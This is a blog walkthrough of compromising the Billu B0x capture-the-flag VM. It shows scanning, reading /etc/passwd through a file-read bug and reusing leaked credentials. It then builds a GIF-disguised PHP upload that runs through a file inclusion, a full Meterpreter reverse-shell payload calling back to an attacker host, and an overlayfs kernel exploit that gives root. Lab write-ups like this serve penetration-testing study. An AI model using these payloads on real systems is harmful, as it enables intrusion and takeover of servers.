---
layout: single
title: How I Hacked Billu B0x
date: 2017-06-01
categories:
  - security
  - ctf
  - walkthrough
tags:
  - billu box
  - vulnhub
---
## Host & Service Discovery
To start my analysis of this CTF, I booted into Kali and started Metasploit [`msfconsole`] and ran an Nmap SYN scan to locate the VM on the network:

```shell_session
msf > db_nmap -sS 10.2.0.0/24
[*] Nmap: Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-30 23:20 BST
***
[*] Nmap: MAC Address: 08:00:27:A8:02:33 (Oracle VirtualBox virtual NIC)
[*] Nmap: Nmap scan report for 10.2.0.104
[*] Nmap: Host is up (0.00012s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT   STATE SERVICE
[*] Nmap: 22/tcp open  ssh
[*] Nmap: 80/tcp open  http
[*] Nmap: MAC Address: 08:00:27:1C:31:B1 (Oracle VirtualBox virtual NIC)
***
[*] Nmap: Nmap done: 256 IP addresses (4 hosts up) scanned in 6.04 seconds
```

From here, I could identify that the machine is available at 10.2.0.104 and is exposing both a web server and an SSH server.

Next, I ran the `ssh_version` scanner to fingerprint the operating system and SSH server:

```shell_session
msf > use auxiliary/scanner/ssh/ssh_version
msf auxiliary(ssh_version) > set RHOSTS 10.2.0.104
RHOSTS => 10.2.0.104
msf auxiliary(ssh_version) > run

[*] 10.2.0.104:22         - SSH server version: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4 ( service.version=5.9p1 openssh.comment=Debian-5ubuntu1.4 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH os.vendor=Ubuntu os.device=General os.family=Linux os.product=Linux os.version=12.04 service.protocol=ssh fingerprint_db=ssh.banner )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

This confirmed that the machine is running Ubuntu 12.04 and OpenSSH 5.9p1:

```shell_session
msf auxiliary(ssh_version) > hosts

Hosts
=====

address     mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------     ---                ----  -------  ---------  -----  -------  ----  --------
10.2.0.104  08:00:27:1c:31:b1        Linux               12.04  server         


msf auxiliary(ssh_version) > services

Services
========

host        port  proto  name  state  info
----        ----  -----  ----  -----  ----
10.2.0.104  22    tcp    ssh   open   SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
10.2.0.104  80    tcp    http  open   
```

## Scanning the Web Server
Now that I had done some basic discovery and fingerprinting, I proceeded to launch Nikto, using `nikto -host 10.2.0.104`, against the web server to see what could be found.

There were a few interesting results within the output:

```shell_session
root@kali:~# nikto -host 10.2.0.104
***
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
***
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
***
+ OSVDB-3092: /test.php: This might be interesting...
+ 8346 requests: 0 error(s) and 21 item(s) reported on remote host
***
```

The first thing Nikto found was that mod_negotiation is enabled, which can be used in combination with the `mod_negotiation_brute` auxiliary module within Metasploit to quickly brute force file names.

The second finding was that Apache appears to be outdated; meaning there could be some important security updates missing.

The third finding was a possible directory traversal / file disclosure vulnerability, however, it turned out to be a false-positive.

The final thing that Nikto found, was a file named `test.php`, and as Nikto suggested, this was indeed interesting...

## Testing Suspicious File for Vulnerabilities
At this point, I should have probably gone and taken a look at the main website being served, but given the unsafe, hacked together code that one usually finds in files aimed at testing / proof of concept, it seemed worth while jumping straight into it!

Navigating to `test.php` presented me with an error:

> 'file' parameter is empty. Please provide file path in 'file' parameter

Since it asked nicely, I obliged! I tried two get requests:

* `test.php?file=/etc/passwd`
* `test.php?file=index.php`

Both returned the same error message again, which indicated maybe the script is reading the `file` field from `$_POST` rather than `$_GET`.

With this in mind, I posted the data instead using cURL and confirmed that there is an arbitrary file access vulnerability within this script:

```shell_session
root@kali:~# curl --data "file=/etc/passwd" http://10.2.0.104/test.php
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:106::/var/run/dbus:/bin/false
whoopsie:x:104:107::/nonexistent:/bin/false
landscape:x:105:110::/var/lib/landscape:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
```

## Examining Code Using The File Access Vulnerability
As I could now view any arbitrary file, I visited the web page to see what I was presented with; which was a login screen.

![Login Page](/assets/images/how-i-hacked-billu-b0x/login-page.png)

Using the previously identified vulnerability in `test.php`, I began to analyse the source code of this page. Lines 28 to 43 of `index.php` show a possible injection point and also show that passwords are being stored in plain text:

```php
$uname=str_replace('\'','',urldecode($_POST['un']));
$pass=str_replace('\'','',urldecode($_POST['ps']));
$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
$result = mysqli_query($conn, $run);

if (mysqli_num_rows($result) > 0) {
  $row = mysqli_fetch_assoc($result);
  echo "You are allowed<br>";
  $_SESSION['logged']=true;
  $_SESSION['admin']=$row['username'];

  header('Location: panel.php', true, 302);   
}
```

As the content of the `un` and `ps` fields are having single quotes stripped from them, I attempted to perform an SQL injection on the login form by using Unicode smuggling to bypass the normalisation of the input, but failed in getting it to work.

On the basis that I may be missing something, I ran sqlmap against the form too, but it also failed to find an injection method.

Although I was sure there is a method of getting around this form that I'm just not seeing, I moved on analysing the source code to see what else I could find.

Lines 4 and 5 of `index.php` included two other files, so I used `test.php` to learn more about them.

The source code of `head.php` contained nothing interesting; it was just markup being used for presentation purposes. The source code of `c.php`, on the other hand, revealed the credentials being used to establish the MySQL connection that is used throughout the rest of the script:

```php
$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
```

Continuing with the analysis of the source code, I took a look at the `panel.php` file that users are redirected to if they successfully login.

The source code of this file showed that it provides users with a dropdown menu to select what they wish to view, but which also introduces a local file inclusion vulnerability (LFI) on line 52:

```php
if(isset($_POST['continue']))
{
  $dir=getcwd();
  $choice=str_replace('./','',$_POST['load']);

  if($choice==='add')
  {
    include($dir.'/'.$choice.'.php');
    die();
  }

  if($choice==='show')
  {
    include($dir.'/'.$choice.'.php');
    die();
  }
  else
  {
    include($dir.'/'.$_POST['load']);
  }
}
```

Next, I looked at `show.php` (one of the files available via the dropdown), which shows that there is no session validation at all in that file, as it is relying on the parent script handling it; meaning we can use this to disclose a list of the users in the system.

Doing so reveals that there are two users in the system, Jack Sparrow and Captain Barbossa:

```shell_session
curl --data "continue=true" http://10.2.0.104/show.php

<table width=90% >
    <tr>
	<td>ID</td>
	<td>User</td>
	<td>Address</td>
	<td>Image</td>
    </tr>
    <tr>
	<td>1</td>
	<td>Jack</td>
	<td>Jack sparrow, Pirate of the caribbean</td>
	<td>
	    <img src="uploaded_images/jack.jpg" height=90px width=100px>
	</td>
    </tr>
    <tr>
	<td>2</td>
	<td>Captain Barbossa</td>
	<td>Captain Barbossa, pirate of the caribbean</td>
	<td>
	    <img src="uploaded_images/CaptBarbossa.JPG" height=90px width=100px>
	</td>
    </tr>
</table>
```

Something I found interesting about the above, was that it became clear that the back end system is allowing admins to manage users in the system, and is allowing for an image to be uploaded and associated with them. This, combined with the LFI vulnerability found in `panel.php` has a good chance of leading to remote code execution, if I can get access to the panel itself.

With this in mind, I looked at `add.php` in the hope it would also have no session validation and also handle the processing of adding new users. Unfortunately, it had no post handling, meaning I was back at the point of requiring a valid session for `panel.php` to let me utilise this.

## The Hunt for MySQL
Now that there were seemingly no more unauthenticated methods I could use to begin code execution and I was failing to get a successful SQLi on the login page, I decided to start looking for a phpMyAdmin installation that I could use the previously acquired MySQL credentials with.

I manually tried the two paths I've seen the most in LAMP stacks first, those being:

* `http://10.2.0.104/phpmyadmin`
* `http://10.2.0.104/pma`

Both URLs returned 404s though, so looking back at my findings from Nikto earlier, I tried the `mod_negotiation_brute` module in Metasploit to see if I can quickly find any new paths that may be of interest, but nothing new was found:

```shell_session
msf > use auxiliary/scanner/http/mod_negotiation_brute
msf auxiliary(mod_negotiation_brute) > set RHOSTS 10.2.0.104
RHOSTS => 10.2.0.104
msf auxiliary(mod_negotiation_brute) > set THREADS 20
THREADS => 20
msf auxiliary(mod_negotiation_brute) > run

[*] 10.2.0.104 /c.php
[*] 10.2.0.104 /head.php
[*] 10.2.0.104 /index.php
[*] 10.2.0.104 /panel.php
[*] 10.2.0.104 /show.php
[*] 10.2.0.104 /test.php
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(mod_negotiation_brute) >
```

Next, I got a bit louder and ran dirb with the `/usr/share/dirb/wordlists/big.txt` wordlist in Kali:

```shell_session
root@kali:~# dirb "http://10.2.0.104/" /usr/share/dirb/wordlists/big.txt
***
---- Scanning URL: http://10.2.0.104/ ----
***                                                                                                                                                                                                                                                                             
---- Entering directory: http://10.2.0.104/phpmy/ ----
+ http://10.2.0.104/phpmy/ChangeLog (CODE:200|SIZE:28878)                                                                                                                                                                                                                       
+ http://10.2.0.104/phpmy/LICENSE (CODE:200|SIZE:18011)                                                                                                                                                                                                                         
+ http://10.2.0.104/phpmy/README (CODE:200|SIZE:2164)                                                                                                                                                                                                                           
+ http://10.2.0.104/phpmy/TODO (CODE:200|SIZE:190)                                                                                                                                                                                                                              
+ http://10.2.0.104/phpmy/changelog (CODE:200|SIZE:8367)                                                                                                                                                                                                                        
***
DOWNLOADED: 61374 - FOUND: 37
```

Bingo! It looks like there is a phpMyAdmin installation, and it is located at `/phpmy`.

Using the previously acquired MySQL credentials (`billu:b0x_billu`), I was now able to login to phpMyAdmin and gain full control of the database.

![phpMyAdmin](/assets/images/how-i-hacked-billu-b0x/phpmyadmin.png)

Looking in the `auth` table of the `ica_lab` database, I was able to get some credentials to login to the web page with (`biLLu:hEx_it`):

![Login Credentials](/assets/images/how-i-hacked-billu-b0x/phpmyadmin-creds.png)

## Getting Remote Code Execution
At this point, it was time to start combining all the information I had gathered earlier during the source code analysis and attempt RCE.

The main points that I had identified were:

* There is an LFI within `panel.php` that will allow me to include any file relative to the current working directory
* I am able to upload image files into the `uploaded_images` directory via the form in `add.php`

My goal now was to try and get PHP code into a file that passes the upload validation, which I can then include using the LFI bug.

Before attempting this, I reviewed the handler of this again within `panel.php`:

```php
$name=mysqli_real_escape_string($conn,$_POST['name']);
$address=mysqli_real_escape_string($conn,$_POST['address']);
$id=mysqli_real_escape_string($conn,$_POST['id']);

if(!empty($_FILES['image']['name']))
{
  $iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
  $r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
  $image=array('jpeg','jpg','gif','png');
  if(in_array($r,$image))
  {
    $finfo = @new finfo(FILEINFO_MIME);
    $filetype = @$finfo->file($_FILES['image']['tmp_name']);
    if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
    {
        if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
        {
            echo "Uploaded successfully ";
            $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')';
            mysqli_query($conn, $update);
        }
    }
    else
    {
        echo "<br>i told you dear, only png,jpg and gif file are allowed";
    }
}
else
{
    echo "<br>only png,jpg and gif file are allowed";
}
```

There are two sets of validation in this handler, one which checks the extension (easily worked around), and another which checks file content (not as easy to work around, but totally doable).

Before creating a shell script, I put together a quick proof of concept to verify this will work. I created a GIF file with the following content and used it when creating a new user in the system:

```php
GIF89a/* */=0;<?php echo 'test'; ?>
```

This file passed the upload validation, and was uploaded to `/uploaded_images/test.gif`.

I now headed back over to `panel.php` and opened up the inspector in FireFox to alter the option value being submitted in the dropdown menu to point to the newly created GIF file:

![GIF spoof test](/assets/images/how-i-hacked-billu-b0x/gif-spoof-test.png)

After hitting the continue button to submit the form, the GIF file was successfully included and the echo statement executed and output "test" to the page; confirming that we can indeed upload arbitrary code via the spoofed GIF and run it using the LFI:

![GIF spoof test](/assets/images/how-i-hacked-billu-b0x/gif-test-success.png)

In addition to doing this manually using the FireFox inspector, it was also possible to invoke it using cURL, which is how I executed it going forward, using the following command:

```shell_session
curl --cookie "PHPSESSID=71fncsbnsag6pd9ombvi66fqp3" --data "load=uploaded_images%2Ftest.gif&continue=1" http://10.2.0.104/panel.php
```

## Getting a Meterpreter Session
With a confirmed way of executing arbitrary code, I used msfvenom to create a reverse TCP Meterpreter script:

```shell_session
root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.0.3 -o shell.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 944 bytes
Saved as: shell.php
```

After generating the script, I created another GIF file named `shell.gif` and used the same format as in the proof of concept to pack the Meterpreter script:

```php
GIF89a/* */=0;/*<?php /**/ error_reporting(0); $ip = '10.2.0.3'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();
```

With the payload packed into the GIF, I now headed over to Metasploit and started up the handler:

```shell_session
msf > use exploit/multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 10.2.0.3
LHOST => 10.2.0.3
msf exploit(handler) > run

[*] Started reverse TCP handler on 10.2.0.3:4444
[*] Starting the payload handler...
```

Now, I repeated the same steps as earlier to invoke the LFI bug and established the session on to the server (woo!)

![Meterpreter session](/assets/images/how-i-hacked-billu-b0x/meterpreter.png)

## Privilege Escalation
My first steps towards privilege escalation consisted of a bit of recon work. I started with checking the kernel version and the current user:

```shell_session
meterpreter > sysinfo
Computer    : indishell
OS          : Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data (33)
meterpreter >
```

I then ran the `local_exploit_suggester` post module, to see if Metasploit could hit gold fast, but unfortunately, no results were found; even though I was positive I had previously seen a kernel exploit that worked with 3.13:

```shell_session
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.2.0.104 - Collecting local exploits for php/linux...
[-] 10.2.0.104 - No suggestions available.
meterpreter >
```

Kernel exploits aside, I began to check the environment a bit more, to see if there's anything already on the system that was of use.

I first checked which users are super users, to find the only super user is root:

```shell_session
meterpreter > shell
Process 1299 created.
Channel 2 created.
python -c 'import pty; pty.spawn("/bin/sh")'

$ awk -F: '($3 == "0") {print}' /etc/passwd
awk -F: '($3 == "0") {print}' /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

I then checked which services were running as root, using `ps aux | grep root`, but nothing particularly interesting showed up at first glance.

Checking the sshd configuration indicated that root logins were permitted. So I traversed the home directories to see if there was anything that could indicate the root password, but the only user with a home directory was `ica`, which was empty:


```shell_session
$ ls -l /home
ls -l /home
total 4
drwxr-xr-x 4 ica ica 4096 Mar 20 10:08 ica
$ ls -l /home/ica
ls -l /home/ica
total 0
```

Next, I checked for files on the system with the SUID or SGID bit set (allowing execution as the owner of said file) using `find / -perm /6000 2> /dev/null`. As with the previous checks - this returned nothing of interest.

With quite a bit of recon work done and nothing promising to follow up on, I went back to looking at exploiting the kernel. The first exploit I tried was [CVE-2016-9793](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9793) but I ran into compiler issues.

I then moved on to trying the overlayfs exploit ([CVE-2015-1328](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1328)), as the kernel version falls within the affected range and this particular exploit has been reliable in almost all cases I've tried it.

I uploaded the source code of the exploit, compiled it and gave it execution permission:

```shell_session
meterpreter > upload /usr/share/exploitdb/platforms/linux/local/37292.c
[*] uploading  : /usr/share/exploitdb/platforms/linux/local/37292.c -> 37292.c
[*] uploaded   : /usr/share/exploitdb/platforms/linux/local/37292.c -> 37292.c
meterpreter > shell
Process 1472 created.
Channel 14 created.
gcc 37292.c -o ofs
chmod +x ofs
```

And finally... I got root!

```shell_session
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# whoami
root
```
